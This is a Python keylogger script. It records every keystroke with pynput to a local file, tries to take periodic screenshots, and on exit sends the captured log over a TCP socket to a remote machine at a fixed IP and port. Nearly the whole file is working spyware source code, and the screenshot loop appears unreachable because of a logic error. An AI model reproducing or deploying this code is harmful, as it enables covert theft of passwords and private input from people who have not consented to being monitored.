from pynput.keyboard import Listener, Key
import datetime
import time
import pyautogui
import socket

def on_press_function(key):
    with open("keylog2.txt", "a") as f:
        # Check for special keys (space, backspace, enter...)
        if key == Key.enter:
            f.write(f" - {datetime.datetime.now()}\n")
            f.write("\n")
        elif key == Key.space:
            f.write(" ")
        elif key == Key.backspace:
            f.write("[BACKSPACE]")
        else:
            f.write(str(key).strip("'"))
# I have to check the functionality of this yet
def capture_screenshot():
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = f"screenshot_{timestamp}.png"

    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    
def send_file():
    # Specify the IP address and port of the receiver machine
    receiver_ip = "192.168.57.5"
    receiver_port = 3333

    with open("keylog2.txt", "rb") as file:
        file_content = file.read()

    # Create a socket and establish a connection
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect((receiver_ip, receiver_port))

            sock.sendall(file_content)

            print("File sent successfully.")
        except ConnectionRefusedError:
            print(f"Connection to {receiver_ip}:{receiver_port} refused. Make sure the server is running.")
        except Exception as e:
            print(f"Error occurred while sending the file: {e}")
            
with Listener(on_press=on_press_function) as listener:
    try:
        listener.join()
        while True:
            capture_screenshot()
            time.sleep(10)
    except KeyboardInterrupt:
        # Handle CTRL+C to terminate the program 
        print("\nProgram terminated by user.")
        with open("keylog2.txt", "a") as f:
            f.write("\n")
        send_file()  # Call send_file() here so that the file is sent before exiting
